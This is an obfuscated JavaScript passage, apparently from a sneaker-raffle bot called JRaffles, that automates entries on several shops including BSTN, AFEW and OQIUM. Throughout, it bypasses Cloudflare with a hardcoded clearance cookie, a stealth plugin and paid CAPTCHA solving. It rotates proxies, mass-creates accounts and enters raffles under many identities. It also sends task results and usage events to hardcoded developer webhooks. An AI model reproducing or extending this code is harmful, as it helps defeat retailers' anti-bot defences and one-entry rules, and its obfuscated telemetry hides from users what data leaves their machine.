            await _0x493629['goto']('' + _0x3395f6[_0x4eba23], { 'waitUntil': 'networkidle2' }), await _0x45ce86(0xbb8);
            try {
                const _0x589caa = await _0x493629['$']('#challenge-heading');
                _0x589caa && (console['log'](_0x3b5d06() + '\x20[' + _0x6c0f63 + ']\x20Task\x20' + (_0x4eba23 + 0x1) + '\x20:\x20' + _0xecbe11['yellow']('2FA\x20Required')), await _0x493629['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x45ce86(0x61a8), await _0x493629['waitForSelector']('#payment-submit-btn'), await _0x493629['$eval']('#payment-submit-btn', _0x34394c => _0x34394c['click']()), await _0x493629['click']('#payment-submit-btn');
                try {
                    await _0x493629['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x45ce86(0x5dc), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x6c0f63 + ']\x20Task\x20' + (_0x4eba23 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x43d718) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x43d718['message']);
                } finally {
                    await _0x493629['close'](), await _0x45ce86(0x4650);
                }
            } catch (_0x14c675) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x6c0f63 + ']\x20Task\x20' + (_0x4eba23 + 0x1) + '\x20:\x20' + _0x14c675));
            }
        }
    } catch (_0x7291ec) {
        console['log'](_0xecbe11['red']('' + _0x7291ec));
    } finally {
        await _0x32726b['close']();
    }
}
async function _0x175ce4(_0x33bd31, _0x2cb2c2, _0x10400c) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x433f47 = 0x0; _0x433f47 < _0x33bd31['length']; _0x433f47++) {
        var _0x37aba7;
        await _0x10d7a7(_0x33bd31, _0x433f47), _0x42c473(_0x10400c['name'] + '\x20Task\x20' + (_0x433f47 + 0x1) + '\x20/\x20' + _0x33bd31['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868);
        var _0x427d53 = await _0x12f7f(_0x33bd31[_0x433f47], _0x10400c, 'acc', ![]);
        const _0x5cef3b = { 'succesDEVMSG': { 'embeds': [_0x427d53] } }, _0x4f72a3 = 'https://www.bstn.com/eu_en/customer/account/';
        var _0x580539 = Math['round'](Math['random']() * (_0x2cb2c2['length'] - 0x1)), _0x3ce9e4 = _0x2cb2c2[_0x580539]['split'](':');
        const _0x5821ca = await _0x4146a9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3ce9e4[0x0] + ':' + _0x3ce9e4[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--force-device-scale-factor=0.3'
            ]
        });
        try {
            const _0x513184 = await _0x5821ca['newPage']();
            await _0x513184['authenticate']({
                'username': '' + _0x3ce9e4[0x2],
                'password': '' + _0x3ce9e4[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x10400c['name'] + ']\x20Task\x20' + (_0x433f47 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x513184['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x513184['setRequestInterception'](!![]), _0x513184['on']('request', _0x2c8d78 => {
                _0x2c8d78['resourceType']() === 'image' ? _0x2c8d78['abort']() : _0x2c8d78['continue']();
            }), await _0x513184['goto']('' + _0x4f72a3), await _0x513184['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x513184['click']('button[class=\x22cf2Lf6\x22]'), await _0x513184['waitForSelector']('a.action.create.primary.social-login'), console['log'](_0x3b5d06() + '\x20[' + _0x10400c['name'] + ']\x20Task\x20' + (_0x433f47 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x45ce86(0x7d0), await _0x513184['click']('a.action.create.primary.social-login'), await _0x45ce86(0x7d0), await _0x513184['click']('button.button.dashboard-actions-toolbar__item'), console['log'](_0x3b5d06() + '\x20[' + _0x10400c['name'] + ']\x20Task\x20' + (_0x433f47 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x45ce86(0x190), await _0x513184['type']('#firstname', _0x33bd31[_0x433f47]['FirstName'], { 'delay': 0xf0 }), await _0x45ce86(0x190), await _0x513184['type']('#lastname', _0x33bd31[_0x433f47]['LastName'], { 'delay': 0xe6 }), await _0x45ce86(0x190), await _0x513184['type']('#bss_email_address', _0x33bd31[_0x433f47]['Email'], { 'delay': 0x122 }), await _0x45ce86(0x190), await _0x513184['type']('#password', _0x33bd31[_0x433f47]['Password'], { 'delay': 0x1e0 }), console['log'](_0x3b5d06() + '\x20[' + _0x10400c['name'] + ']\x20Task\x20' + (_0x433f47 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x45ce86(0x2bc), await _0x513184['click']('#bt-social-create'), await _0x513184['click']('#bt-social-create'), await _0x45ce86(0x1388), await _0x513184['waitForSelector']('div.mesg-success'), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x10400c['name'] + ']\x20Task\x20' + (_0x433f47 + 0x1) + '\x20:\x20Account\x20' + _0x33bd31[_0x433f47]['Email'] + '\x20Generated')), _0x5e836d['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x33bd31[_0x433f47]['Email'] + ',' + _0x33bd31[_0x433f47]['Password']);
            try {
                _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x5cef3b['succesDEVMSG']);
            } catch {
            }
            await _0x32e91d(_0x20d1d0, _0x5cef3b['succesDEVMSG']), console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x10400c['name'] + ']\x20Task\x20' + (_0x433f47 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x16feb5) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x10400c['name'] + ']\x20Task\x20' + (_0x433f47 + 0x1) + '\x20:\x20' + _0x16feb5)), _0x37aba7 = '' + _0x16feb5;
            var _0x2034ed = await _0x12f7f(_0x33bd31[_0x433f47], _0x10400c, 'dev', !![], _0x37aba7);
            _0x5cef3b['errorDEV'] = { 'embeds': [_0x2034ed] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x5cef3b['errorDEV']), await _0x32e91d(_0x49aba5, _0x5cef3b['errorDEV']);
        } finally {
            _0x5821ca['close'](), console['log'](_0x3b5d06() + '\x20[' + _0x10400c['name'] + ']\x20Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x5b313c(_0x4ad756, _0x1d4361, _0x49670e) {
    _0x4146a9['use'](_0xc40ee6());
    for (var _0x4cceb5 = 0x0; _0x4cceb5 < _0x4ad756['length']; _0x4cceb5++) {
        var _0x1319a8 = Math['round'](Math['random']() * (_0x1d4361['length'] - 0x1)), _0x12905e = _0x1d4361[_0x1319a8]['split'](':');
        const _0x5dfbdc = await _0x4146a9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x12905e[0x0] + ':' + _0x12905e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3c16c4 = await _0x5dfbdc['newPage']();
            await _0x3c16c4['authenticate']({
                'username': '' + _0x12905e[0x2],
                'password': '' + _0x12905e[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x49670e['name'] + ']\x20Task\x20' + (_0x4cceb5 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x3c16c4['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3c16c4['setRequestInterception'](!![]), _0x3c16c4['on']('request', _0x69ec26 => {
                _0x69ec26['resourceType']() === 'image' || _0x69ec26['resourceType']() === 'font' || _0x69ec26['resourceType']() === 'media' ? _0x69ec26['abort']() : _0x69ec26['continue']();
            }), console['log'](_0x3b5d06() + '\x20[' + _0x49670e['name'] + ']\x20Task\x20' + (_0x4cceb5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c16c4['goto'](_0x4ad756[_0x4cceb5]), console['log'](_0x3b5d06() + '\x20[' + _0x49670e['name'] + ']\x20Task\x20' + (_0x4cceb5 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x3c16c4['waitForTimeout'](0xbb8);
            try {
                await _0x3c16c4['waitForSelector']('.dashboard-main_title'), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x49670e['name'] + ']\x20Task\x20' + (_0x4cceb5 + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x243f0e = await _0x12f7f(null, _0x49670e, 'ver', ![]);
                const _0x3caf01 = { 'succesDEVMSG': { 'embeds': [_0x243f0e] } };
                await _0x32e91d(_0x504cbb, _0x3caf01['succesDEVMSG']);
            } catch (_0x3d2183) {
                throw new Error(_0x3d2183);
            }
        } catch (_0x5d7187) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x49670e['name'] + ']\x20Task\x20' + (_0x4cceb5 + 0x1) + '\x20:\x20' + _0x5d7187));
            var _0x48cad6 = _0x5d7187, _0x3385bb = await _0x12f7f(null, _0x49670e, 'ver', !![], _0x48cad6);
            const _0x5c5eeb = { 'errorDEVMSG': { 'embeds': [_0x3385bb] } };
            _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x5c5eeb['errorDEVMSG']), await _0x32e91d(_0x49aba5, _0x5c5eeb['errorDEVMSG']);
        } finally {
            _0x5dfbdc['close'](), console['log'](_0x3b5d06() + '\x20[' + _0x49670e['name'] + ']\x20Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0xa88405(_0x279b65, _0x36b385, _0x4e8b2a) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x127d80 = 0x0; _0x127d80 < _0x279b65['length']; _0x127d80++) {
        var _0x1557c7;
        await _0x10d7a7(_0x279b65, _0x127d80), _0x42c473(_0x4e8b2a['name'] + '\x20Task\x20' + (_0x127d80 + 0x1) + '\x20/\x20' + _0x279b65['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868);
        var _0x395414 = Math['round'](Math['random']() * (_0x36b385['length'] - 0x1)), _0x5a1e9e = _0x36b385[_0x395414]['split'](':');
        const _0x58c6a9 = await _0x4146a9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5a1e9e[0x0] + ':' + _0x5a1e9e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1dbb85 = await _0x58c6a9['newPage'](), _0x2b9588 = await _0x1dbb85['target']()['createCDPSession'](), { windowId: _0x3baf10 } = await _0x2b9588['send']('Browser.getWindowForTarget');
            await _0x1dbb85['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            });
            var _0x3e9aab = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x1dbb85['setCookie'](_0x3e9aab[0x0]), await _0x1dbb85['authenticate']({
                'username': '' + _0x5a1e9e[0x2],
                'password': '' + _0x5a1e9e[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Task\x20' + (_0x127d80 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1dbb85['goto']('' + _0x279b65[_0x127d80]['Url']), console['log'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Task\x20' + (_0x127d80 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1dbb85['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x2b9588['send']('Browser.setWindowBounds', {
                'windowId': _0x3baf10,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x45ce86(0x1388), await _0x1dbb85['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1dbb85['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x45ce86(0x1f4), console['log'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Task\x20' + (_0x127d80 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1dbb85['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x4999ed => _0x4999ed['click']()), await _0x1dbb85['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1dbb85['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x45ce86(0x7d0), await _0x1dbb85['waitForSelector']('#email-login'), await _0x1dbb85['type']('#email-login', '' + _0x279b65[_0x127d80]['Email']), await _0x45ce86(0x1f4), await _0x1dbb85['waitForSelector']('#password'), await _0x1dbb85['type']('#password', '' + _0x279b65[_0x127d80]['Password']), await _0x45ce86(0x1f4);
            try {
                await _0x1dbb85['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0xee2ce2 => _0xee2ce2['click']()), await _0x1dbb85['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x1dbb85['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x467933) {
            }
            await _0x45ce86(0x3e8);
            const _0xc2d4bd = await _0x1dbb85['$']('.enteredDraw_container__2KmQ_');
            if (_0xc2d4bd)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Task\x20' + (_0x127d80 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x279b65[_0x127d80]['Size']);
            if (_0x279b65[_0x127d80]['Size'] != 'RANDOM') {
                var _0x5eda91 = _0x279b65[_0x127d80]['Size']['replace']('.', ',');
                const _0x28e706 = await _0x1dbb85['$x']('//div[contains(text(),\x20' + _0x5eda91 + ')]');
                await _0x28e706[0x0]['click']();
            } else {
                const _0x212657 = await _0x1dbb85['$$']('div.swatchTile_tile__IRH9Q');
                var _0x92e916 = Math['round'](Math['random']() * (_0x212657['length'] - 0x1));
                await _0x212657[_0x92e916]['click']();
            }
            await _0x45ce86(0x1f4);
            const _0x4bce68 = await _0x1dbb85['$']('.addressList_addressItem__LE2PB');
            if (_0x4bce68) {
            } else
                console['log'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Task\x20' + (_0x127d80 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x1dbb85['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x45ce86(0x5dc), await _0x1dbb85['waitForSelector']('#firstname'), await _0x1dbb85['type']('#firstname', '' + _0x279b65[_0x127d80]['FirstName']), await _0x45ce86(0x1f4), await _0x1dbb85['waitForSelector']('#firstname'), await _0x1dbb85['type']('#lastname', '' + _0x279b65[_0x127d80]['LastName']), await _0x45ce86(0x1f4), await _0x1dbb85['waitForSelector']('#firstname'), await _0x1dbb85['type']('#street', '' + _0x279b65[_0x127d80]['Address1']), await _0x45ce86(0x1f4), await _0x1dbb85['waitForSelector']('#firstname'), await _0x1dbb85['type']('#houseNumber', _0x279b65[_0x127d80]['HouseNumber'] + '\x20' + _0x279b65[_0x127d80]['Address2']), await _0x45ce86(0x1f4), await _0x1dbb85['waitForSelector']('#firstname'), await _0x1dbb85['select']('#country_code', '' + _0x279b65[_0x127d80]['Country']), await _0x45ce86(0x1f4), await _0x1dbb85['type']('#postcode', '' + _0x279b65[_0x127d80]['Zip']), await _0x45ce86(0x1f4), await _0x1dbb85['type']('#city', '' + _0x279b65[_0x127d80]['City']), await _0x45ce86(0x1f4), await _0x1dbb85['type']('#telephone', '' + _0x279b65[_0x127d80]['Phone']), await _0x45ce86(0x1f4), await _0x1dbb85['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x45ce86(0x9c4);
            try {
                await _0x1dbb85['type']('#instagram_name', '' + _0x279b65[_0x127d80]['Follower']), await _0x1dbb85['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            await _0x45ce86(0x5dc), await _0x1dbb85['click']('.checkBox_boxHolder__wLGVe'), await _0x45ce86(0x1f4), await _0x1dbb85['click']('.termConditions_TC__hll9k\x20>\x20button'), await _0x45ce86(0x1388), await _0x1dbb85['waitForSelector']('.success_msg__2HjJY'), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Task\x20' + (_0x127d80 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x4adf83 = await _0x12f7f(_0x279b65[_0x127d80], _0x4e8b2a, 'dev', ![]), _0x5e6692 = await _0x12f7f(_0x279b65[_0x127d80], _0x4e8b2a, 'pub', ![]);
            const _0x2479b5 = {
                'succesDEVMSG': { 'embeds': [_0x4adf83] },
                'succesPUBMSG': { 'embeds': [_0x5e6692] }
            };
            try {
                _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x2479b5['succesDEVMSG']), await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0x2479b5['succesDEVMSG']), await _0x45ce86(0xc8), await _0x32e91d(_0x1fcd8b, _0x2479b5['succesPUBMSG']);
            } catch (_0x1e1556) {
                console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Task\x20' + (_0x127d80 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1e1556));
            }
        } catch (_0x4377fe) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Task\x20' + (_0x127d80 + 0x1) + '\x20:\x20' + _0x4377fe)), _0x1557c7 = '' + _0x4377fe;
            var _0x4f476e = await _0x12f7f(_0x279b65[_0x127d80], _0x4e8b2a, 'dev', !![], _0x1557c7), _0x4adf83 = await _0x12f7f(_0x279b65[_0x127d80], _0x4e8b2a, 'dev', ![]), _0x5e6692 = await _0x12f7f(_0x279b65[_0x127d80], _0x4e8b2a, 'pub', ![]);
            const _0x2cd5eb = {
                'succesDEVMSG': { 'embeds': [_0x4adf83] },
                'succesPUBMSG': { 'embeds': [_0x5e6692] }
            };
            _0x2cd5eb['errorDEV'] = { 'embeds': [_0x4f476e] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x2cd5eb['errorDEV']), await _0x32e91d(_0x49aba5, _0x2cd5eb['errorDEV']);
        } finally {
            _0x58c6a9['close'](), console['log'](_0x3b5d06() + '\x20[' + _0x4e8b2a['name'] + ']\x20Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x2e7e17() {
    await _0x1d2b3a(), console['clear']();
    if (_0x37a22d != 'devkey') {
        let _0x2634f9 = await _0x5a453a['autoUpdate']();
        if (_0x2634f9 === 'yes')
            return _0x5a4029('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x3f9b2a == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x45ce86(0x2710);
        ;
    }
    await _0x2f53a6(_0x3f9b2a);
    if (_0x430354 === ![])
        return console['log']('Closing\x20Browser'), await _0x45ce86(0xbb8);
    else
        try {
            var _0x29b0b6 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x5ce999
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x37a22d
                    }
                ]
            }];
            const _0x35b820 = { 'embeds': _0x29b0b6 };
            var _0x4400d2 = await _0x12f7f(null, null, 'open', ![]);
            const _0x1c6393 = { 'openDEVMSG': { 'embeds': [_0x4400d2] } };
            await _0x32e91d(_0x30dfe8, _0x1c6393['openDEVMSG']);
            async function _0x219c3d() {
                _0x42c473('JRaffles\x20' + _0x37a22d), console['clear'](), console['log']('Welcome\x20to\x20' + _0xecbe11['cyan']('JRaffles();') + '\x20' + _0x37a22d), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x322671 = 0x0; _0x322671 < _0x4e2615['length'] - 0x3; _0x322671++) {
                    if (_0x4e2615[_0x322671]['name'] === 'Reload\x20Settings' || _0x4e2615[_0x322671]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x322671 + ')\x20[' + _0x4e2615[_0x322671]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x4e2615['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x4e2615['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x4e2615['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x5a5cad();
                if (taskModule > _0x4e2615['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x45ce86(0x3e8), _0x219c3d();
                if (_0x4e2615[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                    var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x4b7ece = await _0x35374c(), _0x4a1a75 = await _0xa4b4b2();
                        await _0xa88405(_0x4a1a75, _0x4b7ece, _0x4f12ee);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x4b7ece = await _0x35374c(), _0x4a1a75 = await _0xa4b4b2();
                            await _0x175ce4(_0x4a1a75, _0x4b7ece, _0x4f12ee);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4b7ece = await _0x35374c(), _0x4a001c = await _0x504840(), _0x364608 = _0x4a001c['split'](';');
                                await _0x5b313c(_0x364608, _0x4b7ece, _0x4f12ee);
                            }
                        }
                    }
                }
                if (_0x4e2615[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                    var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4b7ece = await _0x35374c(), _0x4ea7c4 = await _0xa4b4b2();
                    if (_0x4ea7c4[0x0]['Url'] == '' || _0x4ea7c4[0x0]['Url'] == undefined) {
                        await _0x265970(_0x4b7ece);
                        var _0x528508 = await _0x341727();
                        return await afewFunction('' + _0x516ec2[_0x528508], 'nor', _0x4f12ee, _0x4ea7c4, _0x4b7ece), _0x219c3d();
                    }
                    return await afewFunction(_0x4ea7c4[0x0]['Url'], 'nor', _0x4f12ee, _0x4ea7c4, _0x4b7ece), _0x219c3d();
                } else {
                    if (_0x4e2615[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                        var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x4b7ece = await _0x35374c(), _0x335662 = await _0xa4b4b2();
                            console['log']('Starting\x20' + _0x335662['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x1ca626 = 0x0; _0x1ca626 < _0x335662['length']; _0x1ca626++) {
                                console['log'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Task\x20' + (_0x1ca626 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x457346(_0x1ca626, 'nor', _0x4f12ee, _0x335662, _0x4b7ece), console['log'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Sleeping\x20for\x20' + _0x32bec3['MahaDelay'] + '\x20ms'), await _0x45ce86(_0x32bec3['MahaDelay']);
                                } catch (_0x3a5535) {
                                    console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Task\x20' + (_0x1ca626 + 0x1) + ':\x20Error\x20' + _0x3a5535));
                                }
                            }
                            ;
                            return _0x219c3d();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4b7ece = await _0x35374c();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x4a001c = await _0x504840(), _0x364608 = _0x4a001c['split'](';'), console['log'](_0x364608['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x1ca626 = 0x0; _0x1ca626 < _0x364608['length']; _0x1ca626++) {
                                    _0x4f12ee['url'] = _0x364608[_0x1ca626], console['log'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Task\x20' + (_0x1ca626 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x457346(_0x1ca626, 'ver', _0x4f12ee, _0x335662, _0x4b7ece), console['log'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Sleeping\x20for\x20' + _0x32bec3['verificationDelay'] + '\x20ms'), await _0x45ce86(_0x32bec3['verificationDelay']);
                                    } catch (_0x264927) {
                                        console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Task\x20' + (_0x1ca626 + 0x1) + ':\x20Error\x20' + _0x264927));
                                    }
                                }
                                ;
                                return _0x219c3d();
                            }
                        }
                    } else {
                        if (_0x4e2615[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                            var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction], _0x4b7ece = await _0x35374c(), _0x5ccab4 = await _0xa4b4b2();
                            return await _0x2858eb(_0x5ccab4, _0x4b7ece, _0x4f12ee), await _0x45ce86(0x1388), _0x219c3d();
                        } else {
                            if (_0x4e2615[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                                var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x4b7ece = await _0x35374c(), _0x3a0c02 = await _0xa4b4b2();
                                    console['log']('Starting\x20' + _0xecbe11['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x1ca626 = 0x0; _0x1ca626 < _0x3a0c02['length']; _0x1ca626++) {
                                        console['log'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Task\x20' + (_0x1ca626 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x6f9798(_0x1ca626, 'nor', _0x4f12ee, _0x3a0c02, _0x4b7ece);
                                        } catch (_0x13cd0a) {
                                            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Task\x20' + (_0x1ca626 + 0x1) + ':\x20Task\x20failed\x20' + _0x13cd0a));
                                        }
                                        console['log'](_0x3b5d06() + '\x20[' + _0x4f12ee['name'] + ']\x20Sleeping\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
                                    }
                                    return _0x219c3d();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x4b7ece = await _0x35374c();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x4a001c = await _0x504840(), _0x364608 = _0x4a001c['split'](';'), console['log'](_0x364608['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x1ca626 = 0x0; _0x1ca626 < _0x364608['length']; _0x1ca626++) {
                                            try {
                                                _0x4f12ee['url'] = _0x364608[_0x1ca626], console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x1ca626 + 0x1) + ':\x20Getting\x20Session'), await _0x6f9798(_0x1ca626, 'ver', _0x4f12ee, null, _0x4b7ece), console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x32bec3['verificationDelay'] + '\x20ms'), await _0x45ce86(_0x32bec3['verificationDelay']);
                                            } catch (_0x424594) {
                                                console['log'](_0x424594), await _0x45ce86(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x219c3d();
                                    }
                                }
                                ;
                            } else {
                                if (_0x4e2615[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
